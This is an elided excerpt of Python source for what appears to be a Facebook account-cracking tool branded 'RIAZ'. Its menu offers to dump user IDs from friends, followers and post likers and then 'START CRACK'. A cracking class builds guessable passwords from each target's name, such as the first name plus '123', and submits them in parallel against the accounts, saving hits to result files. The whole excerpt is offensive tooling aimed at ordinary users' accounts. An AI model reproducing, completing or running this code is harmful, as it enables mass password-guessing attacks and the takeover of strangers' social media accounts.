...
def mr_error():
    ...
    os.system('echo "
\n [1]. DUMP(RIAZ) ID FROM FRIENDS
\n [2]. DUMP(RIAZ) ID FROM PUBLIC FRIEND
\n [3]. DUMP(RIAZ) ID FROM TOTAL FOLLOWERS
\n [4]. DUMP(RIAZ) ID FROM LIKE POST
\n [5]. START CRACK
...
\n [7]. USER AGENT SETTINGS"| lolcat -a -d 2')
    ...
    if innocent == '':
        ...
        try:
            ...
            print(" %s[%s#%s] ═════════RIAZ══════════════════════════════"%(N,O,N));time.sleep(2)
...
def teman(nunu):
    ...
    try:
        ...
        os.system('echo "═══════════RIAZ══════════════════════════════════" | lolcat -a -d 2 -s 50')
...
class __crack__:
    ...
    def __pler__(self):
        ...
        if axm == '':
            ...
            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
            with axim_xau(max_workers=30) as (__riaz__):
            	for azmx in self.id: 
                    try:
                        uid, name = azmx.split('<=>')
                        xz = name.split(' ')
            	...
            	for azmx in self.id: 
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            xnx = [name.lower(), xz[0]+xz[1].lower(), xz[0]+"123", xz[1].lower()+"123", xz[0].lower()+"1234", xz[0].lower()+"12345"]
                        __riaz__.submit(self.__mbasic__, uid, xnx)
                    except:
                        pass
